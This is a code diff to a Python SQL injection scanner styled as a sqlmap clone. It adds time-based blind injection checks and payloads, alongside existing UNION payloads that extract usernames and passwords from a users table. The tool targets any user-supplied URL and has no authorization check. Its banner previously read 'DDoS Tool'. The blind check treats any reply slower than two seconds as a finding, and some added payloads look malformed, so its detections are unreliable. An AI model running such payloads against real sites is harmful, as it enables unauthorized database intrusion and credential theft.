@@ -5,6 +5,7 @@ from termcolor import colored, cprint
 from threading import Thread
 from queue import Queue
 import json
+import random
 
 logging.basicConfig(
     filename="sqlmap_clone_advanced.log",
@@ -22,12 +23,13 @@ def log_message(message, level="info"):
     print(message)
 
 class SQLInjectionScanner:
-    def __init__(self, url, param, payloads, timeout=10, threads=5):
+    def __init__(self, url, param, payloads, timeout=10, threads=5, dbms_type=None):
         self.url = url
         self.param = param
         self.payloads = payloads
         self.timeout = timeout
         self.threads = threads
+        self.dbms_type = dbms_type
         self.queue = Queue()
         self.vulnerabilities = []
 
@@ -49,10 +51,33 @@ class SQLInjectionScanner:
             cprint(f"[!] Error testing payload '{payload}': {e}", "red")
         return False
 
+    def test_blind_injection(self, payload):
+        injection_url = f"{self.url}?{self.param}={payload}"
+        try:
+            start_time = time.time()
+            response = requests.get(injection_url, timeout=self.timeout)
+            elapsed_time = time.time() - start_time
+            if elapsed_time > 2:
+                cprint(f"[!] Blind SQL Injection (Time-based) detected with payload: {payload}", "green")
+                cprint(f"[!] Vulnerable URL: {injection_url}", "cyan")
+                self.vulnerabilities.append({
+                    "payload": payload,
+                    "url": injection_url,
+                    "response": response.text[:500]
+                })
+                return True
+        except requests.exceptions.RequestException as e:
+            cprint(f"[!] Error testing blind payload '{payload}': {e}", "red")
+        return False
+
     def worker(self):
         while not self.queue.empty():
             payload = self.queue.get()
             if self.test_payload(payload):
+                while not self.queue.empty():
+                    self.queue.get()
+                break
+            elif self.test_blind_injection(payload):
                 while not self.queue.empty():
                     self.queue.get()
                 break
@@ -101,7 +126,7 @@ class SQLInjectionScanner:
 
 if __name__ == "__main__":
     print(colored("=====================================", 'cyan'))
-    print(colored("[×] DDoS Tool by 𝘾𝙞𝙥𝙝𝙚𝙧 𝙎𝙦𝙪𝙞𝙙", 'red'))
+    print(colored("[×] SQL Injection Scanner", 'red'))
     print(colored("[×] Use responsibly!", 'yellow'))
     print(colored("=====================================", 'cyan'))
 
@@ -131,6 +156,8 @@ if __name__ == "__main__":
             "' OR 'a'='a",
             "' UNION SELECT username, password FROM users--",
             "' UNION SELECT table_name, column_name FROM information_schema.columns--",
+            "'; IF(1=1) WAITFOR DELAY '00:00:05'--",
+            "'; IF(1=1) SLEEP(5)--",
         ]
 
     cprint("How many threads do you want to use? (default: 5)", "blue")
@@ -139,6 +166,8 @@ if __name__ == "__main__":
     except ValueError:
         threads = 5
 
-    scanner = SQLInjectionScanner(url, param, payloads, threads=threads)
+    dbms_type = input(colored("Enter the target DBMS (mysql, postgresql, mssql, or leave empty): ", "blue")).strip().lower()
+
+    scanner = SQLInjectionScanner(url, param, payloads, threads=threads, dbms_type=dbms_type)
     scanner.run_scan()
     scanner.generate_report()
